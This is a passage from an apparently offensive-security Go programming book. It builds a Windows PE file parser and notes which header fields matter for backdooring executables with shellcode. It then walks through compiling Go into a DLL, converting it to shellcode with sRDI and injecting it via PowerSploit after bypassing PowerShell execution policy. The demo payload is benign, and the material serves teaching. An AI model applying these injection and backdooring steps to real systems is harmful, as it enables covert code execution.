    fmt.Printf("[+] Sections Alignment: %#x\n", oh32.SectionAlignment)&#13;
    fmt.Printf("[+] File Alignment: %#x\n", oh32.FileAlignment)&#13;
    fmt.Printf("[+] Characteristics: %#x\n", pefile.FileHeader.Characteristics)&#13;
    fmt.Printf("[+] Size of Headers: %#x\n", oh32.SizeOfHeaders)&#13;
    fmt.Printf("[+] Checksum: %#x\n", oh32.CheckSum)&#13;
    fmt.Printf("[+] Machine: %#x\n", pefile.FileHeader.Machine)&#13;
    fmt.Printf("[+] Subsystem: %#x\n", oh32.Subsystem)&#13;
    fmt.Printf("[+] DLLCharacteristics: %#x\n", oh32.DllCharacteristics)&#13;
<span epub:type="pagebreak" id="page_285"/>/* OUTPUT&#13;
[-----Optional Header-----]&#13;
[+] Entry Point: 0x169e682 <span class="ent">❶</span>&#13;
[+] ImageBase: 0x400000 <span class="ent">❷</span>&#13;
[+] Size of Image: 0x3172000 <span class="ent">❸</span>&#13;
[+] Sections Alignment: 0x1000 <span class="ent">❹</span>&#13;
[+] File Alignment: 0x200 <span class="ent">❺</span>&#13;
[+] Characteristics: 0x102&#13;
[+] Size of Headers: 0x400&#13;
[+] Checksum: 0x2e41078&#13;
[+] Machine: 0x14c&#13;
[+] Subsystem: 0x2&#13;
[+] DLLCharacteristics: 0x8140&#13;
*/</pre>&#13;
<p class="caption" id="ch12list20"><em>Listing 12-20: Writing Optional Header values to terminal output (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/peParser/main.go">/ch-12/peParser/main.go</a><em>)</em></p>&#13;
<p class="indent">Assuming that the objective is to backdoor a PE file, you’ll need to know both the <span class="literal">ImageBase</span> <span class="ent">❷</span> and <span class="literal">Entry Point</span> <span class="ent">❶</span> in order to hijack and memory jump to the location of the shellcode or to a new section defined by the number of <span class="literal">Section Table</span> entries. The <span class="literal">ImageBase</span> is the address of the first byte of the image once it is loaded into memory, whereas the <span class="literal">Entry Point</span> is the address of the executable code relative to the <span class="literal">ImageBase</span>. The <span class="literal">Size of Image</span> <span class="ent">❸</span> is the actual size of the image, in its entirety, when loaded into memory. This value will need to be adjusted to accommodate any increase in image size, which could happen if you added a new section containing shellcode.</p>&#13;
<p class="indent">The <span class="literal">Sections Alignment</span> <span class="ent">❹</span> will provide the byte alignment when sections are loaded into memory: <span class="literal">0x1000</span> is a rather standard value. The <span class="literal">File Alignment</span> <span class="ent">❺</span> provides the byte alignment of the sections on raw disk: <span class="literal">0x200 (512K)</span> is also a common value. You’ll need to modify these values in order to get working code, and you’ll have to use a hex editor and a debugger if you’re planning to perform all this manually.</p>&#13;
<p class="indent">The Optional Header contains numerous entries. Instead of describing every single one of them, we recommend that you explore the documentation at <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-windows-specific-fields-image-only"><em>https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-windows-specific-fields-image-only</em></a> to gain a comprehensive understanding of each entry.</p>&#13;
<h5 class="h5">Parsing the Data Directory</h5>&#13;
<p class="noindent">At runtime, the Windows executable must know important information, such as how to consume a linked DLL or how to allow other application processes to consume resources that the executable has to offer. The binary also needs to manage granular data, such as thread storage. This is the primary function of the Data Directory.</p>&#13;
<p class="indent">The <em>Data Directory</em> is the last 128 bytes of the Optional Header and pertains specifically to a binary image. We use it to maintain a table of references containing both an individual directory’s offset address to the data location and the size of the data. Exactly 16 directory entries are defined within the <em>WINNT.H</em> header, which is a core Windows header file <span epub:type="pagebreak" id="page_286"/>that defines various data types and constants to be used throughout the Windows operating system.</p>&#13;
<p class="indent">Note that not all of the directories are in use, as some are reserved or unimplemented by Microsoft. The entire list of data directories and details of their intended use can be referenced at <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only"><em>https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only</em></a>. Again, a lot of information is associated with each individual directory, so we recommend you take some time to really research and get familiar with their structures.</p>&#13;
<p class="indent">Let’s explore a couple of directory entries within the Data Directory by using the code in <a href="ch12.xhtml#ch12list21">Listing 12-21</a>.</p>&#13;
<pre>    // Print Data Directory&#13;
    fmt.Println("[-----Data Directory-----]")&#13;
    var winnt_datadirs = []string{ <span class="ent">❶</span>&#13;
        "IMAGE_DIRECTORY_ENTRY_EXPORT",&#13;
        "IMAGE_DIRECTORY_ENTRY_IMPORT",&#13;
        "IMAGE_DIRECTORY_ENTRY_RESOURCE",&#13;
        "IMAGE_DIRECTORY_ENTRY_EXCEPTION",&#13;
        "IMAGE_DIRECTORY_ENTRY_SECURITY",&#13;
        "IMAGE_DIRECTORY_ENTRY_BASERELOC",&#13;
        "IMAGE_DIRECTORY_ENTRY_DEBUG",&#13;
        "IMAGE_DIRECTORY_ENTRY_COPYRIGHT",&#13;
        "IMAGE_DIRECTORY_ENTRY_GLOBALPTR",&#13;
        "IMAGE_DIRECTORY_ENTRY_TLS",&#13;
        "IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG",&#13;
        "IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT",&#13;
        "IMAGE_DIRECTORY_ENTRY_IAT",&#13;
        "IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT",&#13;
        "IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR",&#13;
        "IMAGE_NUMBEROF_DIRECTORY_ENTRIES",&#13;
    }&#13;
   for idx, directory := range oh32.DataDirectory { <span class="ent">❷</span>&#13;
        fmt.Printf("[!] Data Directory: %s\n", winnt_datadirs[idx])&#13;
        fmt.Printf("[+] Image Virtual Address: %#x\n", directory.VirtualAddress)&#13;
        fmt.Printf("[+] Image Size: %#x\n", directory.Size)&#13;
    }&#13;
/* OUTPUT&#13;
[-----Data Directory-----]&#13;
[!] Data Directory: IMAGE_DIRECTORY_ENTRY_EXPORT <span class="ent">❸</span>&#13;
[+] Image Virtual Address: 0x2a7b6b0 <span class="ent">❹</span>&#13;
[+] Image Size: 0x116c <span class="ent">❺</span>&#13;
[!] Data Directory: IMAGE_DIRECTORY_ENTRY_IMPORT <span class="ent">❻</span>&#13;
 [+] Image Virtual Address: 0x2a7c81c&#13;
 [+] Image Size: 0x12c&#13;
<span class="codeitalic1">--snip--</span>&#13;
*/</pre>&#13;
<p class="caption" id="ch12list21"><em>Listing 12-21: Parsing the Data Directory for address offset and size (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/peParser/main.go">/ch-12/peParser/main.go</a><em>)</em></p>&#13;
<p class="indent">The Data Directory list <span class="ent">❶</span> is statically defined by Microsoft, meaning that the literal individual directory names will remain in a consistently ordered list. As such, they are considered to be constants. We will use a <span epub:type="pagebreak" id="page_287"/>slice variable, <span class="literal">winnt_datadirs</span>, to store the individual directory entries so we can reconcile names to index positions. Specifically, the Go PE package implements the Data Directory as a struct object, so we’re required to iterate over each entry to extract the individual directory entries, along with their respective address offset and size attributes. The <span class="literal">for</span> loop is 0-index based, so we just output each slice entry relative to its index position <span class="ent">❷</span>.</p>&#13;
<p class="indent">The directory entries being displayed to standard output are the <span class="literal">IMAGE</span><span class="literal">_DIRECTORY_ENTRY_EXPORT</span> <span class="ent">❸</span>, or the EAT, and the <span class="literal">IMAGE_DIRECTORY_ENTRY_IMPORT</span> <span class="ent">❻</span>, or the IAT. Each of these directories maintains a table of exported and imported functions, respectively, relative to the running Windows executable. Looking further at <span class="literal">IMAGE_DIRECTORY_ENTRY_EXPORT</span>, you will see the virtual address <span class="ent">❹</span> containing the offset of the actual table data, along with the size <span class="ent">❺</span> of the data contained within.</p>&#13;
<h5 class="h5">Parsing the Section Table</h5>&#13;
<p class="noindent">The <em>Section Table</em>, the last PE byte structure, immediately follows the Optional Header. It contains the details of each relevant section in the Windows executable binary, such as executable code and initialized data location offsets. The number of entries matches the <span class="literal">NumberOfSections</span> defined within the COFF File Header. You can locate the Section Table at the PE signature offset + <span class="literal">0xF8</span>. Let’s take a look at this section within a hex editor (<a href="ch12.xhtml#ch12fig8">Figure 12-8</a>).</p>&#13;
<div class="image"><img src="Images/12fig08.jpg" alt="Image" width="857" height="485"/></div>&#13;
<p class="figcap" id="ch12fig8"><em>Figure 12-8: The Section Table, as observed using a hex editor</em></p>&#13;
<p class="indent">This particular Section Table starts with <span class="literal">.text</span>, but it might start with a <span class="literal">CODE</span> section, depending on the binary’s compiler. The <span class="literal">.text</span> (or <span class="literal">CODE</span>) section contains the executable code, whereas the next section, <span class="literal">.rodata</span>, contains read-only constant data. The <span class="literal">.rdata</span> section contains resource data, and the <span class="literal">.data</span> section contains initialized data. Each section is at least 40 bytes in length.</p>&#13;
<p class="indent">You can access the Section Table within the COFF File Header. You can also access each section individually, using the code in <a href="ch12.xhtml#ch12list22">Listing 12-22</a>.</p>&#13;
<pre><span epub:type="pagebreak" id="page_288"/>    s := pefile.Section(".text")&#13;
    fmt.Printf("%v", *s)&#13;
/* Output&#13;
{{.text 25509328 4096 25509376 1024 0 0 0 0 1610612768} [] 0xc0000643c0 0xc0000643c0}&#13;
*/</pre>&#13;
<p class="caption" id="ch12list22"><em>Listing 12-22: Parsing a specific section from the Section Table (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/peParser/main.go">/ch-12/peParser/main.go</a><em>)</em></p>&#13;
<p class="indent">The other option is to iterate over the entire Section Table, as shown in <a href="ch12.xhtml#ch12list23">Listing 12-23</a>.</p>&#13;
<pre>    fmt.Println("[-----Section Table-----]")&#13;
    for _, section := range pefile.Sections { <span class="ent">❶</span>&#13;
        fmt.Println("[+] --------------------")&#13;
        fmt.Printf("[+] Section Name: %s\n", section.Name)&#13;
        fmt.Printf("[+] Section Characteristics: %#x\n", section.Characteristics)&#13;
        fmt.Printf("[+] Section Virtual Size: %#x\n", section.VirtualSize)&#13;
        fmt.Printf("[+] Section Virtual Offset: %#x\n", section.VirtualAddress)&#13;
        fmt.Printf("[+] Section Raw Size: %#x\n", section.Size)&#13;
        fmt.Printf("[+] Section Raw Offset to Data: %#x\n", section.Offset)&#13;
        fmt.Printf("[+] Section Append Offset (Next Section): %#x\n", section.Offset+section.Size)&#13;
    }&#13;
&#13;
/* OUTPUT&#13;
[-----Section Table-----]&#13;
[+] --------------------&#13;
[+] Section Name: .text <span class="ent">❷</span>&#13;
[+] Section Characteristics: 0x60000020 <span class="ent">❸</span>&#13;
[+] Section Virtual Size: 0x1853dd0 <span class="ent">❹</span>&#13;
[+] Section Virtual Offset: 0x1000 <span class="ent">❺</span>&#13;
[+] Section Raw Size: 0x1853e00 <span class="ent">❻</span>&#13;
[+] Section Raw Offset to Data: 0x400 <span class="ent">❼</span>&#13;
[+] Section Append Offset (Next Section): 0x1854200 <span class="ent">❽</span>&#13;
[+] --------------------&#13;
[+] Section Name: .rodata&#13;
[+] Section Characteristics: 0x60000020&#13;
[+] Section Virtual Size: 0x1b00&#13;
[+] Section Virtual Offset: 0x1855000&#13;
[+] Section Raw Size: 0x1c00&#13;
[+] Section Raw Offset to Data: 0x1854200&#13;
[+] Section Append Offset (Next Section): 0x1855e00&#13;
<span class="codeitalic1">--snip--</span>&#13;
*/</pre>&#13;
<p class="caption" id="ch12list23"><em>Listing 12-23: Parsing all sections from a Section Table (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/peParser/main.go">/ch-12/peParser/main.go</a><em>)</em></p>&#13;
<p class="indent">Here, we’re iterating over all the sections within the Section Table <span class="ent">❶</span> and writing the <span class="literal">name</span> <span class="ent">❷</span>, <span class="literal">virtual size</span> <span class="ent">❹</span>, <span class="literal">virtual address</span> <span class="ent">❺</span>, <span class="literal">raw size</span> <span class="ent">❻</span>, and <span class="literal">raw offset</span> <span class="ent">❼</span> to standard output. Also, we calculate the next 40-byte offset address <span class="ent">❽</span> in the event that we’d want to append a new section. The <span class="literal">characteristics</span> value <span class="ent">❸</span> describes how the section is to behave as part of the binary. For example, the <span class="literal">.text</span> section provides a value of 0x60000020. <span epub:type="pagebreak" id="page_289"/>Referencing the relevant <span class="literal">Section Flags</span> data at <em><a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#section-flags">https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#section-flags</a></em> (<a href="ch12.xhtml#ch12tab2">Table 12-2</a>), we can see that three separate attributes make up the value.</p>&#13;
<p class="tabcap" id="ch12tab2"><strong>Table 12-2:</strong> Characteristics of Section Flags</p>&#13;
<table class="topbot-d2">&#13;
<colgroup>&#13;
<col style="width:30%"/>&#13;
<col style="width:20%"/>&#13;
<col style="width:50%"/>&#13;
</colgroup>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-h1a"><p class="taba"><strong>Flag</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h1a"><p class="taba"><strong>Value</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h1a"><p class="taba"><strong>Description</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-h1a"><p class="taba"><span class="literal">IMAGE_SCN_CNT_CODE</span></p></td>&#13;
<td style="vertical-align: top;" class="table-h1a"><p class="taba">0x00000020</p></td>&#13;
<td style="vertical-align: top;" class="table-h1a"><p class="taba">The section contains executable code.</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">IMAGE_SCN_MEM_EXECUTE</span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba">0x20000000</p></td>&#13;
<td style="vertical-align: top;"><p class="taba">The section can be executed as code.</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">IMAGE_SCN_MEM_READ</span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba">0x40000000</p></td>&#13;
<td style="vertical-align: top;"><p class="taba">The section can be read.</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">The first value, 0x00000020 (<span class="literal">IMAGE_SCN_CNT_CODE</span>), states that the section contains executable code. The second value, 0x20000000 (<span class="literal">IMAGE_SCN_MEM_EXECUTE</span>), states that the section can be executed as code. Lastly, the third value, 0x40000000 (<span class="literal">IMAGE_SCN_MEM_READ</span>), allows the section to be read. Therefore, adding all these together provides the value 0x60000020. If you’re adding a new section, keep in mind that you’ll need to update all these properties with their appropriate values.</p>&#13;
<p class="indent">This wraps up our discussion of the PE file data structure. It was a brief overview, we know. Each section could be its own chapter. However, it should be enough to allow you to use Go as a means to navigate arbitrary data structures. The PE data structure is quite involved and it’s well worth the time and effort necessary to become familiar with all of its components.</p>&#13;
<h4 class="h4" id="ch12lev2sec12">Additional Exercises</h4>&#13;
<p class="noindent">Take the knowledge you just learned about the PE file data structure and expand upon it. Here are some additional ideas that will help reinforce your understanding, while also providing a chance to explore more of the Go PE package:</p>&#13;
<ul>&#13;
<li><p class="noindent">Obtain various Windows binaries and use a hex editor and a debugger to explore the various offset values. Identify how various binaries are different, such as their number of sections. Use the parser that you built in this chapter to both explore and verify your manual observations.</p></li>&#13;
<li><p class="noindent">Explore new areas of the PE file structure, such as the EAT and IAT. Now, rebuild the parser to support DLL navigation.</p></li>&#13;
<li><p class="noindent">Add a new section to an existing PE file to include your shiny new shellcode. Update the entire section to include the appropriate number of sections, entry point, and raw and virtual values. Do this all over again, but this time, instead of adding a new section, use an existing section and create a code cave.</p></li>&#13;
<li><p class="noindent">One topic that we didn’t discuss was how to handle PE files that have been code packed, either with common packers, such as UPX, or more obscure packers. Find a binary that has been packed, identify how it was packed and what packer was used, and then research the appropriate technique to unpack the code.</p></li>&#13;
</ul>&#13;
<h3 class="h3" id="ch12lev1sec5"><span epub:type="pagebreak" id="page_290"/>Using C with Go</h3>&#13;
<p class="noindent">Another method of accessing the Windows API is to leverage C. By directly using C, you could take advantage of an existing library that is available only in C, create a DLL (which we can’t do using Go alone), or simply call the Windows API. In this section, we’ll first install and configure a C toolchain that is compatible with Go. We will then look at examples of how to use C code in Go programs and how to include Go code in C programs.</p>&#13;
<h4 class="h4" id="ch12lev2sec13">Installing a C Windows Toolchain</h4>&#13;
<p class="noindent">To compile programs that contain a combination of Go and C, you’ll need a suitable C toolchain that can be used to build portions of C code. On Linux and macOS, you can install the GNU Compiler Collection (GCC) by using a package manager. On Windows, installing and configuring a toolchain is a bit more involved and can lead to frustration if you’re not familiar with the many options available. The best option we found is to use MSYS2, which packages MinGW-w64, a project created to support the GCC toolchain on Windows. Download and install this from <a href="https://www.msys2.org/"><em>https://www.msys2.org</em>/</a> and follow the instructions on that page to install your C toolchain. Also, remember to add the compiler to your <span class="literal">PATH</span> variable.</p>&#13;
<h4 class="h4" id="ch12lev2sec14">Creating a Message Box Using C and the Windows API</h4>&#13;
<p class="noindent">Now that we have a C toolchain configured and installed, let’s look at a simple Go program that leverages embedded C code. <a href="ch12.xhtml#ch12list24">Listing 12-24</a> contains C that uses the Windows API to create a message box, which gives us a visual display of the Windows API in use.</p>&#13;
<pre>   package main&#13;
&#13;
<span class="ent">❶</span> /*&#13;
   #include &lt;stdio.h&gt;&#13;
   #include &lt;windows.h&gt;&#13;
&#13;
<span class="ent">❷</span> void box()&#13;
   {&#13;
       MessageBox(0, "Is Go the best?", "C GO GO", 0x00000004L);&#13;
   }&#13;
   */&#13;
<span class="ent">❸</span> import "C"&#13;
   func main() {&#13;
&#13;
    <span class="ent">❹</span> C.box()&#13;
   }</pre>&#13;
<p class="caption" id="ch12list24"><em>Listing 12-24: Go using C (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/messagebox/main.go">/ch-12/messagebox/main.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_291"/>C code can be provided through external file <span class="literal">include</span> statements <span class="ent">❶</span>. It can also be embedded directly in a Go file. Here we are using both methods. To embed C code into a Go file, we use a comment, inside of which we define a function that will create a <span class="literal">MessageBox</span> <span class="ent">❷</span>. Go supports comments for many compile-time options, including compiling C code. Immediately after the closing comment tag, we use <span class="literal">import "C"</span> to tell the Go compiler to use CGO, a package that allows the Go compiler to link native C code at build time <span class="ent">❸</span>. Within the Go code, we can now call functions defined in C, and we call the <span class="literal">C.box()</span> function, which executes the function defined in the body of our C code <span class="ent">❹</span>.</p>&#13;
<p class="indent">Build the sample code by using <span class="literal">go build</span>. When executed, you should get a message box.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>Though the CGO package is extremely convenient, allowing you to call C libraries from Go code as well as call Go libraries from C code, using it gets rid of Go’s memory manager and garbage disposal. If you want to reap the benefits of Go’s memory manager, you should allocate memory within Go and then pass it to C. Otherwise, Go’s memory manager won’t know about allocations you’ve made using the C memory manager, and those allocations won’t be freed unless you call C’s native <span class="codeitalic">free()</span> method. Not freeing the memory correctly can have adverse effects on your Go code. Finally, just like opening file handles in Go, use <span class="codeitalic">defer</span> within your Go function to ensure that any C memory that Go references is garbage collected.</em></p>&#13;
</div>&#13;
<h4 class="h4" id="ch12lev2sec15">Building Go into C</h4>&#13;
<p class="noindent">Just as we can embed C code into Go programs, we can embed Go code into C programs. This is useful because, as of this writing, the Go compiler can’t build our programs into DLLs. That means we can’t build utilities such as reflective DLL injection payloads (like the one we created earlier in this chapter) with Go alone.</p>&#13;
<p class="indent">However, we can build our Go code into a C archive file, and then use C to build the archive file into a DLL. In this section, we’ll build a DLL by converting our Go code into a C archive file. Then we’ll convert that DLL into shellcode by using existing tools, so we can inject and execute it in memory. Let’s start with the Go code (<a href="ch12.xhtml#ch12list25">Listing 12-25</a>), saved in a file called <em>main.go</em>.</p>&#13;
<pre>   package main&#13;
<span class="ent">❶</span> import "C"&#13;
   import "fmt"&#13;
<span class="ent">❷</span> //export Start&#13;
<span class="ent">❸</span> func Start() {&#13;
       fmt.Println("YO FROM GO")&#13;
   }&#13;
&#13;
<span class="ent">❹</span> func main() {&#13;
   }</pre>&#13;
<p class="caption" id="ch12list25"><em>Listing 12-25: The Go payload (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/dllshellcode/main.go">/ch-12/dllshellcode/main.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_292"/>We import C to include CGO into our build <span class="ent">❶</span>. Next, we use a comment to tell Go that we want to export a function in our C archive <span class="ent">❷</span>. Finally, we define the function we want to convert into C <span class="ent">❸</span>. The <span class="literal">main()</span> function <span class="ent">❹</span> can remain empty.</p>&#13;
<p class="indent">To build the C archive, execute the following command:</p>&#13;
<pre>&gt; <span class="codestrong1">go build -buildmode=c-archive</span></pre>&#13;
<p class="indent">We should now have two files, an archive file called <em>dllshellcode.a</em> and an associated header file called <em>dllshellcode.h</em>. We can’t use these quite yet. We have to build a shim in C and force the compiler to include <em>dllshellcode.a</em>. One elegant solution is to use a function table. Create a file that contains the code in <a href="ch12.xhtml#ch12list26">Listing 12-26</a>. Call this file <em>scratch.c</em>.</p>&#13;
<pre>#include "dllshellcode.h"&#13;
void (*table[1]) = {Start};</pre>&#13;
<p class="caption" id="ch12list26"><em>Listing 12-26: A function table saved in the</em> scratch.c <em>file (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/dllshellcode/scratch.c">/ch-12/dllshellcode/scratch.c</a><em>)</em></p>&#13;
<p class="indent">We can now use GCC to build the <em>scratch.c</em> C file into a DLL by using the following command:</p>&#13;
<pre>&gt; <span class="codestrong1">gcc -shared -pthread -o x.dll scratch.c dllshellcode.a -lWinMM -lntdll -lWS2_32</span></pre>&#13;
<p class="indent">To convert our DLL into shellcode, we’ll use sRDI (<a href="https://github.com/monoxgas/sRDI/"><em>https://github.com/monoxgas/sRDI/</em></a>), an excellent utility that has a ton of functionality. To begin, download the repo by using Git on Windows and, optionally, a GNU/Linux machine, as you may find GNU/Linux to be a more readily available Python 3 environment. You’ll need Python 3 for this exercise, so install it if it’s not already installed.</p>&#13;
<p class="indent">From the <em>sRDI</em> directory, execute a <span class="literal">python3</span> shell. Use the following code to generate a hash of the exported function:</p>&#13;
<pre>&gt;&gt;&gt; <span class="codestrong1">from ShellCodeRDI import *</span>&#13;
&gt;&gt;&gt; <span class="codestrong1">HashFunctionName('Start')</span>&#13;
1168596138</pre>&#13;
<p class="indent">The sRDI tools will use the hash to identify a function from the shellcode we’ll generate later.</p>&#13;
<p class="indent">Next, we’ll leverage PowerShell utilities to generate and execute shellcode. For convenience, we will use some utilities from PowerSploit (<a href="https://github.com/PowerShellMafia/PowerSploit"><em>https://github.com/PowerShellMafia/PowerSploit</em></a><em>/)</em>, which is a suite of PowerShell utilities we can leverage to inject shellcode. You can download this using Git. From the <em>PowerSploit\CodeExecution</em> directory, launch a new PowerShell shell:</p>&#13;
<pre>c:\tools\PowerSploit\CodeExecution&gt; <span class="codestrong1">powershell.exe -exec bypass</span>&#13;
Windows PowerShell&#13;
Copyright (C) 2016 Microsoft Corporation. All rights reserved.</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_293"/>Now import two PowerShell modules from PowerSploit and sRDI:</p>&#13;
<pre>PS C:\tools\PowerSploit\CodeExecution&gt; <span class="codestrong1">Import-Module .\Invoke-Shellcode.ps1</span>&#13;
PS C:\tools\PowerSploit\CodeExecution&gt; <span class="codestrong1">cd ..\..\sRDI</span>&#13;
PS C:\tools\sRDI&gt; <span class="codestrong1">cd .\PowerShell\</span>&#13;
PS C:\tools\sRDI\PowerShell&gt; <span class="codestrong1">Import-Module .\ConvertTo-Shellcode.ps1</span></pre>&#13;
<p class="indent">With both modules imported, we can use <span class="literal">ConvertTo-Shellcode</span> from sRDI to generate shellcode from the DLL, and then pass this into <span class="literal">Invoke-Shellcode</span> from PowerSploit to demonstrate the injection. Once this executes, you should observe your Go code executing:</p>&#13;
<pre>PS C:\tools\sRDI\PowerShell&gt; <span class="codestrong1">Invoke-Shellcode -Shellcode (ConvertTo-Shellcode&#13;
-File C:\Users\tom\Downloads\x.dll -FunctionHash 1168596138)</span>&#13;
&#13;
Injecting shellcode into the running PowerShell process!&#13;
Do you wish to carry out your evil plans?&#13;
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y&#13;
YO FROM GO</pre>&#13;
<p class="indent">The message <span class="literal">YO FROM Go</span> indicates that we have successfully launched our Go payload from within a C binary that was converted into shellcode. This unlocks a whole host of possibilities.</p>&#13;
<h3 class="h3" id="ch12lev1sec6">Summary</h3>&#13;
<p class="noindent">That was quite a lot to discuss, and yet it just scratches the surface. We started the chapter with a brief discussion about navigating the Windows API documentation so you’d be familiar with reconciling Windows objects to usable Go objects: these include functions, parameters, data types, and return values. Next, we discussed the use of <span class="literal">uintptr</span> and <span class="literal">unsafe.Pointer</span> to perform disparate type conversions necessary when interacting with the Go <span class="literal">syscall</span> package, along with the potential pitfalls to avoid. We then tied everything together with a demonstration of process injection, which used various Go system calls to interact with Windows process internals.</p>&#13;
<p class="indent">From there, we discussed the PE file format structure, and then built a parser to navigate the different file structures. We demonstrated various Go objects that make navigating the binary PE file a bit more convenient and finished up with notable offsets that may be interesting when backdooring a PE file.</p>&#13;
<p class="indent">Lastly, you built a toolchain to interoperate with Go and native C code. We briefly discussed the CGO package while focusing on creating C code examples and exploring novel tools for creating native Go DLLs.</p>&#13;
<p class="indent">Take this chapter and expand on what you’ve learned. We urge you to continuously build, break, and research the many attack disciplines. The Windows attack surface is constantly evolving, and having the right knowledge and tooling will only help to make the adversarial journey more attainable.<span epub:type="pagebreak" id="page_294"/></p>&#13;
</div>



  </body></html>